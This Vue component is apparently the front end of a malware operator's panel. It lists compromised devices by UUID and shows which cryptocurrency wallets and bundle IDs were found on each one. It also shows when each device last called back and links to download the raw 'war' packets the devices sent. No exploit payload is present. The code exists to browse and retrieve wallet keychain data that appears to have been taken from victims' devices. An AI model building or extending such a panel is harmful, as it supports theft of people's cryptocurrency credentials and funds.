<script setup lang="ts">
import { onMounted, ref } from 'vue'
import { panelApi } from '@/api/panel'
import type { ManagedDevice, WarFileRef } from '@/api/types'
import EmptyState from '@/components/EmptyState.vue'
import { tsShort, fmtBytes } from '@/utils/format'
import { downloadUrl } from '@/api/http'
import { Coin, Download } from '@element-plus/icons-vue'

/**
 * 钱包钥匙串（简洁列表）：
 *   按设备 uuid 一行，显示该设备命中的钱包/包名，并可点击下载 war 原包。
 *   不做条目级解析（解析半吊子且无必要）——只回答“哪台设备命中了哪些钱包 + 原包下载”。
 * 数据源：/panel/api/devices?wallet=wallet（已含 wallets[] 与 war_files[]）。
 */
const rows = ref<ManagedDevice[]>([])
const total = ref(0)
const page = ref(1)
const per = ref(50)
const loading = ref(false)
const kw = ref('')

async function load() {
  loading.value = true
  try {
    const r = await panelApi.devices(kw.value.trim(), 'wallet', page.value, per.value)
    rows.value = r?.devices ?? []
    total.value = Number(r?.total ?? 0)
  } catch {
    rows.value = []
    total.value = 0
  } finally {
    loading.value = false
  }
}
function search() {
  page.value = 1
  void load()
}
function onPage(p: number) {
  page.value = p
  void load()
}
function onSize(s: number) {
  per.value = s
  page.value = 1
  void load()
}

/** 命中钱包：显示名 + 匹配到的包名（bundle id），去重。 */
function walletNames(d: ManagedDevice): string[] {
  const out: string[] = []
  for (const w of d.wallets ?? []) {
    const label = (w.display || w.rule || '').trim()
    if (label) out.push(label)
    for (const b of w.bundle_ids ?? []) if (b) out.push(b)
  }
  return [...new Set(out)]
}

function warHref(w: WarFileRef) {
  return w.file ? downloadUrl('war', w.file) : `/panel/download?packet_id=${w.packet_id}`
}
function shortName(f?: string, id?: number) {
  if (f) return f.length > 16 ? f.slice(0, 16) + '…' : f
  return '#' + id
}
onMounted(load)
</script>

<template>
  <section class="app-card">
    <div class="app-card__head">
      <h3 class="app-card__title">
        <el-icon><Coin /></el-icon>钱包钥匙串
        <span class="chip">{{ total }} 台设备</span>
      </h3>
      <div class="row">
        <el-input v-model="kw" size="small" placeholder="搜索设备 uuid / IP" clearable style="width: 240px"
          @keyup.enter="search" @clear="search" />
        <el-button size="small" type="primary" @click="search">搜索</el-button>
        <el-button size="small" :loading="loading" @click="load">刷新</el-button>
      </div>
    </div>

    <div class="app-card__body app-card__body--flush">
      <el-table :data="rows" size="small" height="calc(100vh - 236px)" empty-text="…">
        <el-table-column label="设备 UUID" min-width="260">
          <template #default="{ row }">
            <span class="mono">{{ row.uuid || '-' }}</span>
          </template>
        </el-table-column>

        <el-table-column label="命中钱包 / 包名" min-width="380">
          <template #default="{ row }">
            <div class="wchips">
              <span v-for="n in walletNames(row)" :key="n" class="chip chip--violet">{{ n }}</span>
              <span v-if="!walletNames(row).length" class="t-3" style="font-size: var(--fs-xs)">—</span>
            </div>
          </template>
        </el-table-column>

        <el-table-column label="war 原包" width="90" align="center">
          <template #default="{ row }"><span class="t-3">{{ (row.war_files ?? []).length }}</span></template>
        </el-table-column>

        <el-table-column label="最近回传" width="150">
          <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.last_seen) }}</span></template>
        </el-table-column>

        <el-table-column label="下载" width="240" fixed="right">
          <template #default="{ row }">
            <template v-if="(row.war_files ?? []).length">
              <a v-for="w in (row.war_files ?? []).slice(0, 3)" :key="String(w.packet_id ?? w.file)" class="btn-dl"
                :href="warHref(w)" :title="`下载 ${w.file || ('packet#' + w.packet_id)}（${fmtBytes(w.size)}）`" download>
                <el-icon><Download /></el-icon>{{ shortName(w.file, w.packet_id) }}
              </a>
            </template>
            <span v-else class="t-3" style="font-size: var(--fs-xs)">无原包</span>
          </template>
        </el-table-column>

        <template #empty><EmptyState text="暂无命中钱包的设备（war 端点尚无回传）" /></template>
      </el-table>
    </div>

    <div class="pager">
      <el-pagination background layout="total, sizes, prev, pager, next, jumper" :total="total"
        :current-page="page" :page-size="per" :page-sizes="[20, 50, 100, 200]" @current-change="onPage"
        @size-change="onSize" />
    </div>
  </section>
</template>

<style scoped>
.wchips {
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
}
.btn-dl {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  margin: 0 8px 4px 0;
  color: var(--brand-2);
  text-decoration: none;
  font-size: var(--fs-xs);
}
.btn-dl:hover {
  text-decoration: underline;
}
.pager {
  display: flex;
  justify-content: flex-end;
  padding: var(--sp-3) var(--sp-4);
}
</style>
